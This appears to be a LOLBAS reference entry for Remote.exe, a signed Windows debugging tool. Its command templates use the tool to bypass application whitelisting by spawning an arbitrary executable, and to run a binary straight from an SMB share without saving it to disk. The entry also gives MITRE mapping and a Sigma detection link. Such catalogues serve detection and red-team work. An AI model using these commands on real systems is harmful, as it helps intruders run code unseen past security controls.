---
Acknowledgement:
- Person: mr.
Author: mr.d0x
Commands:
- Category: AWL Bypass
  Command: Remote.exe /s {PATH:.exe} anythinghere
  Description: Spawns specified executable as a child process of remote.exe
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Executes a process under a trusted Microsoft signed binary
- Category: Execute
  Command: Remote.exe /s {PATH:.exe} anythinghere
  Description: Spawns specified executable as a child process of remote.exe
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Executes a process under a trusted Microsoft signed binary
- Category: Execute
  Command: Remote.exe /s {PATH_SMB:.exe} anythinghere
  Description: Run a remote file
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  - Execute: Remote
  Usecase: Executing a remote binary without saving file to disk
Created: 2021-06-01
Description: Debugging tool included with Windows Debugging Tools
Detection:
- IOC: remote.exe process spawns
- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml
Full_Path:
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe
Name: Remote.exe
Resources:
- Link: https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
mitre_data:
  technique_ids:
  - T1127
tags:
- lolbas/othermsbinaries
---

# Remote.exe

Debugging tool included with Windows Debugging Tools

# Path(s)

- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe`

# AWL Bypass Commands

Spawns specified executable as a child process of remote.exe

```batch
Remote.exe /s {PATH:.exe} anythinghere
```

- **Usecase:** Executes a process under a trusted Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



# Execute Commands

Spawns specified executable as a child process of remote.exe

```batch
Remote.exe /s {PATH:.exe} anythinghere
```

- **Usecase:** Executes a process under a trusted Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



Run a remote file

```batch
Remote.exe /s {PATH_SMB:.exe} anythinghere
```

- **Usecase:** Executing a remote binary without saving file to disk
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



# Resource(s)

- https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
# Acknowledgements

- mr.d0x (Authored, 2021-06-01)
- mr.